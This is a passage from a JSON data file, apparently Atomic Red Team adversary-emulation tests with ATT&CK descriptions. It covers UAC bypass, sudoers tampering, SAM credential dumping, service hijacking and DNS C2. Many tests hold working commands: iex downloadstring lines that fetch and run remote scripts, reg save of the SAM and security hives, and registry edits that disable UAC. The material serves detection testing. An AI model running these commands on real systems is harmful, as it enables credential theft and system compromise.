"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\61 Akagi64.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n", "prereq_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"}], "executor": {"command": "\"#{uacme_exe}\"\n", "cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n", "name": "command_prompt"}}, {"name": "WinPwn - UAC Magic", "auto_generated_guid": "964d8bf8-37bc-4fd3-ba36-ad13761ebbcc", "description": "UAC bypass using Magic technique via function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique magic", "name": "powershell"}}, {"name": "WinPwn - UAC Bypass ccmstp technique", "auto_generated_guid": "f3c145f9-3c8d-422c-bd99-296a17a8f567", "description": "UAC bypass using ccmstp technique via function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\calc.exe\" -technique ccmstp", "name": "powershell"}}, {"name": "WinPwn - UAC Bypass DiskCleanup technique", "auto_generated_guid": "1ed67900-66cd-4b09-b546-2a0ef4431a0c", "description": "UAC bypass using DiskCleanup technique via function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique DiskCleanup", "name": "powershell"}}, {"name": "WinPwn - UAC Bypass DccwBypassUAC technique", "auto_generated_guid": "2b61977b-ae2d-4ae4-89cb-5c36c89586be", "description": "UAC Bypass DccwBypassUAC technique via function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')", "name": "powershell"}}, {"name": "Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key", "auto_generated_guid": "251c5936-569f-42f4-9ac2-87a173b9e9b8", "description": "Disable User Account Conrol (UAC) for admin by setting the registry key \nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ConsentPromptBehaviorAdmin to 0.\n\n[MedusaLocker Ransomware](https://cloudsek.com/technical-analysis-of-medusalocker-ransomware/), \n[Purple Fox Rootkit](https://blogs.blackberry.com/en/2022/01/threat-thursday-purple-fox-rootkit), \n[Avaddon Ransomware](https://blogs.blackberry.com/en/2021/06/threat-thursday-avaddon-ransomware-uses-ddos-attacks-as-triple-threat)\n", "supported_platforms": ["windows"], "executor": {"command": "$orgValue =(Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin\nSet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force", "cleanup_command": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value $orgValue -Type Dword -Force\n", "name": "powershell", "elevation_required": true}}, {"name": "UAC Bypass with WSReset Registry Modification", "auto_generated_guid": "3b96673f-9c92-40f1-8a3e-ca060846f8d9", "description": "The following UAC bypass is focused on a registry key under \"HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command\" that will trigger a command once wsreset.exe runs. \nThis bypass is limited to Windows 10 1803/1809 and may not run on Server platforms. The registry mod is where interest will be.\nIf successful, the command to run will spawn off wsreset.exe. \n[UAC Bypass in Windows 10 Store Binary](https://0x1.gitlab.io/exploit/UAC-Bypass-in-Windows-10-Store-Binary/)\n", "supported_platforms": ["windows"], "input_arguments": {"commandpath": {"description": "Registry path", "type": "string", "default": "HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command"}, "commandtorun": {"description": "Command to run", "type": "string", "default": "C:\\Windows\\System32\\cmd.exe /c start cmd.exe"}}, "executor": {"command": "New-Item #{commandpath} -Force | Out-Null\nNew-ItemProperty -Path #{commandpath} -Name \"DelegateExecute\" -Value \"\" -Force | Out-Null\nSet-ItemProperty -Path #{commandpath} -Name \"(default)\" -Value \"#{commandtorun}\" -Force -ErrorAction SilentlyContinue | Out-Null\n$Process = Start-Process -FilePath \"C:\\Windows\\System32\\WSReset.exe\" -WindowStyle Hidden", "cleanup_command": "Remove-Item #{commandpath} -Recurse -Force\n", "name": "powershell"}}, {"name": "Disable UAC - Switch to the secure desktop when prompting for elevation via registry key", "auto_generated_guid": "85f3a526-4cfa-4fe7-98c1-dea99be025c7", "description": "User Account Control (UAC) is a security mechanism for limiting the elevation of privileges, including administrative accounts, unless authorized. \nThis setting ensures that the elevation prompt is only used in secure desktop mode.\nDisable User Account Conrol (UAC) for secure desktop by setting the registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\PromptOnSecureDesktop to 0.\n", "supported_platforms": ["windows"], "executor": {"command": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force", "cleanup_command": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name PromptOnSecureDesktop -Value 1 -Type Dword -Force\n", "name": "powershell", "elevation_required": true}}]}, "T1548.003": {"name": "Sudo and Sudo Caching", "technique_id": "attack-pattern--1365fe3b-0f50-455d-b4da-266ce31c23b0", "external_id": "T1548.003", "data_components": ["Command Execution", "Process Metadata", "File Modification", "Process Creation"], "kill_chain_phases": ["privilege-escalation", "defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f"], "description": "Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.\n\nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\"(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nThe sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit this file though.\n\nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.\n\nIn the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>.(Citation: cybereason osx proton) In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.", "atomic_tests": [{"name": "Sudo usage", "auto_generated_guid": "150c3a08-ee6e-48a6-aeaf-3659d24ceb4e", "description": "Common Sudo enumeration methods.\n", "supported_platforms": ["macos", "linux"], "executor": {"name": "sh", "elevation_required": true, "command": "sudo -l      \nsudo cat /etc/sudoers\nsudo vim /etc/sudoers\n"}}, {"name": "Sudo usage (freebsd)", "auto_generated_guid": "2bf9a018-4664-438a-b435-cc6f8c6f71b1", "description": "Common Sudo enumeration methods.\n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if sudo is installed.\n", "prereq_command": "if [ ! -x \"$(command -v sudo)\" ]; then exit 1; else exit 0; fi;\n", "get_prereq_command": "(which pkg && pkg install -y sudo)\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "sudo -l      \nsudo cat /usr/local/etc/sudoers\nsudo ee /usr/local/etc/sudoers\n"}}, {"name": "Unlimited sudo cache timeout", "auto_generated_guid": "a7b17659-dd5e-46f7-b7d1-e6792c91d0bc", "description": "Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.\n", "supported_platforms": ["macos", "linux"], "executor": {"name": "sh", "elevation_required": true, "command": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers\nsudo visudo -c -f /etc/sudoers\n"}}, {"name": "Unlimited sudo cache timeout (freebsd)", "auto_generated_guid": "a83ad6e8-6f24-4d7f-8f44-75f8ab742991", "description": "Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.\n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if sudo is installed.\n", "prereq_command": "if [ ! -x \"$(command -v sudo)\" ]; then exit 1; else exit 0; fi;\n", "get_prereq_command": "(which pkg && pkg install -y sudo)\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers\nsudo visudo -c -f /usr/local/etc/sudoers\n"}}, {"name": "Disable tty_tickets for sudo caching", "auto_generated_guid": "91a60b03-fb75-4d24-a42e-2eb8956e8de1", "description": "Sets sudo caching tty_tickets value to disabled. This is dangerous to modify without using 'visudo', do not do this on a production system.\n", "supported_platforms": ["macos", "linux"], "executor": {"name": "sh", "elevation_required": true, "command": "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /etc/sudoers\"\nsudo visudo -c -f /etc/sudoers\n"}}, {"name": "Disable tty_tickets for sudo caching (freebsd)", "auto_generated_guid": "4df6a0fe-2bdd-4be8-8618-a6a19654a57a", "description": "Sets sudo caching tty_tickets value to disabled. This is dangerous to modify without using 'visudo', do not do this on a production system.\n", "supported_platforms": ["linux"], "dependency_executor_name": "sh", "dependencies": [{"description": "Check if sudo is installed.\n", "prereq_command": "if [ ! -x \"$(command -v sudo)\" ]; then exit 1; else exit 0; fi;\n", "get_prereq_command": "(which pkg && pkg install -y sudo)\n"}], "executor": {"name": "sh", "elevation_required": true, "command": "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /usr/local/etc/sudoers\"\nsudo visudo -c -f /usr/local/etc/sudoers\n"}}]}, "T1003.002": {"name": "Security Account Manager", "technique_id": "attack-pattern--1644e709-12d2-41e5-a60f-3470991f5011", "external_id": "T1003.002", "data_components": ["File Access", "Command Execution", "Windows Registry Key Access"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a", "course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3", "course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f"], "description": "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\n\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with Reg:\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7)\n\nNotes: \n\n* RID 500 account is the local, built-in administrator.\n* RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.\n", "atomic_tests": [{"name": "Registry dump of SAM, creds, and secrets", "auto_generated_guid": "5c2571d0-1572-416d-9676-812e64ca9f44", "description": "Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated\nvia three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7\n\nUpon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.\n", "supported_platforms": ["windows"], "executor": {"command": "reg save HKLM\\sam %temp%\\sam\nreg save HKLM\\system %temp%\\system\nreg save HKLM\\security %temp%\\security\n", "cleanup_command": "del %temp%\\sam >nul 2> nul\ndel %temp%\\system >nul 2> nul\ndel %temp%\\security >nul 2> nul\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Registry parse with pypykatz", "auto_generated_guid": "a96872b2-cbf3-46cf-8eb4-27e8c0e85263", "description": "Parses registry hives to obtain stored credentials\n", "supported_platforms": ["windows"], "dependency_executor_name": "command_prompt", "dependencies": [{"description": "Computer must have python 3 installed\n", "prereq_command": "py -3 --version >nul 2>&1\nexit /b %errorlevel%\n", "get_prereq_command": "echo \"Python 3 must be installed manually\"\n"}, {"description": "Computer must have pip installed\n", "prereq_command": "py -3 -m pip --version >nul 2>&1\nexit /b %errorlevel%\n", "get_prereq_command": "echo \"PIP must be installed manually\"\n"}, {"description": "pypykatz must be installed and part of PATH\n", "prereq_command": "pypykatz -h >nul 2>&1\nexit /b %errorlevel%\n", "get_prereq_command": "pip install pypykatz\n"}], "executor": {"command": "pypykatz live registry\n", "name": "command_prompt", "elevation_required": true}}, {"name": "esentutl.exe SAM copy", "auto_generated_guid": "a90c2f4d-6726-444e-99d2-a00cd7c20480", "description": "Copy the SAM hive using the esentutl.exe utility\nThis can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.\n", "supported_platforms": ["windows"], "input_arguments": {"file_path": {"description": "Path to the file to copy", "type": "path", "default": "%SystemRoot%/system32/config/SAM"}, "file_name": {"description": "Name of the copied file", "type": "string", "default": "SAM"}, "copy_dest": {"description": "Destination of the copied file", "type": "string", "default": "%temp%"}}, "executor": {"command": "esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}\n", "name": "command_prompt", "elevation_required": true, "cleanup_command": "del #{copy_dest}\\#{file_name} >nul 2>&1\n"}}, {"name": "PowerDump Hashes and Usernames from Registry", "auto_generated_guid": "804f28fc-68fc-40da-b5a2-e9d0bce5c193", "description": "Executes a hashdump by reading the hashes from the registry.", "supported_platforms": ["windows"], "dependencies": [{"description": "PowerDump script must exist on disk at specified location", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1\") {exit 0} else {exit 1} ", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-Webrequest -Uri \"https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1\""}], "executor": {"command": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green\nImport-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1\"\nInvoke-PowerDump", "name": "powershell", "elevation_required": true}}, {"name": "dump volume shadow copy hives with certutil", "auto_generated_guid": "eeb9751a-d598-42d3-b11c-c122d9c3f6c7", "description": "Dump hives from volume shadow copies with the certutil utility, exploiting a vulnerability known as \"HiveNightmare\" or \"SeriousSAM\".\nThis can be done with a non-admin user account. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n", "supported_platforms": ["windows"], "input_arguments": {"target_hive": {"description": "Hive you wish to dump", "type": "string", "default": "SAM"}, "limit": {"description": "Limit to the number of shadow copies to iterate through when trying to copy the hive", "type": "integer", "default": 10}}, "executor": {"command": "for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%a\\Windows\\System32\\config\\#{target_hive}\" %temp%\\#{target_hive}vss%a 2 >nul 2>&1) & dir /B %temp%\\#{target_hive}vss*\n", "name": "command_prompt", "elevation_required": false, "cleanup_command": "for /L %a in (1,1,#{limit}) do @(del %temp%\\#{target_hive}vss%a >nul 2>&1)\n"}}, {"name": "dump volume shadow copy hives with System.IO.File", "auto_generated_guid": "9d77fed7-05f8-476e-a81b-8ff0472c64d0", "description": "Dump hives from volume shadow copies with System.IO.File. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n", "supported_platforms": ["windows"], "input_arguments": {"target_hive": {"description": "Hive you wish to dump", "type": "string", "default": "SAM"}, "limit": {"description": "Limit to the number of shadow copies to iterate through when trying to copy the hive", "type": "integer", "default": 10}}, "executor": {"command": "1..#{limit} | % { \n try { [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\#{target_hive}\" , \"$env:TEMP\\#{target_hive}vss$_\", \"true\") } catch {}\n ls \"$env:TEMP\\#{target_hive}vss$_\" -ErrorAction Ignore\n}\n", "name": "powershell", "elevation_required": false, "cleanup_command": "1..#{limit} | % {\n  rm \"$env:TEMP\\#{target_hive}vss$_\" -ErrorAction Ignore\n}\n"}}, {"name": "WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes", "auto_generated_guid": "0c0f5f06-166a-4f4d-bb4a-719df9a01dbb", "description": "Loot local Credentials - Dump SAM-File for NTLM Hashes technique via function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsamfile -consoleoutput -noninteractive  ", "name": "powershell"}}]}, "T1574.011": {"name": "Services Registry Permissions Weakness", "technique_id": "attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c", "external_id": "T1574.011", "data_components": ["Command Execution", "Service Modification", "Windows Registry Key Modification", "Process Creation"], "kill_chain_phases": ["persistence", "privilege-escalation", "defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--a2c36a5d-4058-475e-8e77-fff75e50d3b9"], "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service\u2019s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation: malware_hides_service)", "atomic_tests": [{"name": "Service Registry Permissions Weakness", "auto_generated_guid": "f7536d63-7fd4-466f-89da-7e48d550752a", "description": "Service registry permissions weakness check and then which can lead to privilege escalation with ImagePath. eg.\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\" /f /v ImagePath /d \"C:\\temp\\AtomicRedteam.exe\"\n", "supported_platforms": ["windows"], "input_arguments": {"weak_service_name": {"description": "weak service check", "type": "string", "default": "weakservicename"}}, "executor": {"command": "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* |FL\nget-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name} |FL\n", "name": "powershell"}}, {"name": "Service ImagePath Change with reg.exe", "auto_generated_guid": "f38e9eea-e1d7-4ba6-b716-584791963827", "description": "Change Service registry ImagePath of a bengin service to a malicious file\n", "supported_platforms": ["windows"], "input_arguments": {"weak_service_name": {"description": "weak service name", "type": "string", "default": "calcservice"}, "weak_service_path": {"description": "weak service path", "type": "string", "default": "%windir%\\system32\\win32calc.exe"}, "malicious_service_path": {"description": "malicious service path", "type": "string", "default": "%windir%\\system32\\cmd.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The service must exist (#{weak_service_name})\n", "prereq_command": "if (Get-Service #{weak_service_name}) {exit 0} else {exit 1}\n", "get_prereq_command": "sc.exe create #{weak_service_name} binpath= \"#{weak_service_path}\"\n"}], "executor": {"command": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\" /f /v ImagePath /d \"#{malicious_service_path}\"\n", "cleanup_command": "sc.exe delete #{weak_service_name}\n", "name": "command_prompt"}}]}, "T1071.004": {"name": "DNS", "technique_id": "attack-pattern--1996eef1-ced3-4d7f-bf94-33298cabbf72", "external_id": "T1071.004", "data_components": ["Network Traffic Content", "Network Traffic Flow"], "kill_chain_phases": ["command-and-control"], "data_source_platforms": [], "mitigations": ["course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c", "course-of-action--20f6a9df-37c4-4e20-9e47-025983b1b39d"], "description": "Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling) ", "atomic_tests": [{"name": "DNS Large Query Volume", "auto_generated_guid": "1700f5d6-5a44-487b-84de-bc66f507b0a6", "description": "This test simulates an infected host sending a large volume of DNS queries to a command and control server.\nThe intent of this test is to trigger threshold based detection on the number of DNS queries either from a single source system or to a single targe domain.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n", "supported_platforms": ["windows"], "input_arguments": {"query_type": {"description": "DNS query type", "type": "string", "default": "TXT"}, "subdomain": {"description": "Subdomain prepended to the domain name", "type": "string", "default": "atomicredteam"}, "query_volume": {"description": "Number of DNS queries to send", "type": "integer", "default": 1000}, "domain": {"description": "Default domain to simulate against", "type": "string", "default": "127.0.0.1.nip.io"}}, "executor": {"command": "for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type \"#{query_type}\" \"#{subdomain}-$(Get-Random -Minimum 1 -Maximum 999999).#{domain}\" -QuickTimeout}\n", "name": "powershell"}}, {"name": "DNS Regular Beaconing", "auto_generated_guid": "3efc144e-1af8-46bb-8ca2-1376bb6db8b6", "description": "This test simulates an infected host beaconing via DNS queries to a command and control server at regular intervals over time.\nThis behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.\nA custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.\n", "supported_platforms": ["windows"], "input_arguments": {"runtime": {"description": "Time in minutes to run the simulation", "type": "integer", "default": 30}, "domain": {"description": "Default domain to simulate against", "type": "string", "default": "127.0.0.1.nip.io"}, "subdomain": {"description": "Subdomain prepended to the domain name", "type": "string", "default": "atomicredteam"}, "query_type": {"description": "DNS query type", "type": "string", "default": "TXT"}, "c2_interval": {"description": "Seconds between C2 requests to the command and control server", "type": "integer", "default": 30}, "c2_jitter": {"description": "Percentage of jitter to add to the C2 interval to create variance in the times between C2 requests", "type": "integer", "default": 20}}, "executor": {"command": "Set-Location \"PathToAtomicsFolder\"\n.\\T1071.004\\src\\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n", "name": "powershell"}}, {"name": "DNS Long Domain Query", "auto_generated_guid": "fef31710-223a-40ee-8462-a396d6b66978", "description": "This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DNS queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DNS queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout.\n", "supported_platforms": ["windows"], "input_arguments": {"query_type": {"description": "DNS query type", "type": "string", "default": "TXT"}, "subdomain": {"description": "Subdomain prepended to the domain name (should be 63 characters to test maximum length)", "type": "string", "default": "atomicredteamatomicredteamatomicredteamatomicredteamatomicredte"}, "domain": {"description": "Default domain to simulate against", "type": "string", "default": "127.0.0.1.nip.io"}}, "executor": {"command": "Set-Location \"PathToAtomicsFolder\"\n.\\T1071.004\\src\\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}\n", "name": "powershell"}}, {"name": "DNS C2", "auto_generated_guid": "e7bf9802-2e78-4db9-93b5-181b7bcd37d7", "description": "This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.\nThe following blogs have more information.\n\nhttps://github.com/iagox86/dnscat2\n\nhttps://github.com/lukebaggett/dnscat2-powershell\n", "supported_platforms": ["windows"], "input_arguments": {"domain": {"description": "Domain Name configured to use DNS Server where your C2 listener is running", "type": "string", "default": "example.com"}, "server_ip": {"description": "IP address of DNS server where your C2 listener is running", "type": "string", "default": "127.0.0.1"}}, "executor": {"command": "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')\nStart-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}\n", "name": "powershell"}}]}, "T1552.005": {"name": "Cloud Instance Metadata API", "technique_id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3", "external_id": "T1552.005", "data_components": ["User Account Authentication"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--1dcaeb21-9348-42ea-950a-f842aaf1ae1f", "course-of-action--20f6a9df-37c4-4e20-9e47-025983b1b39d", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual 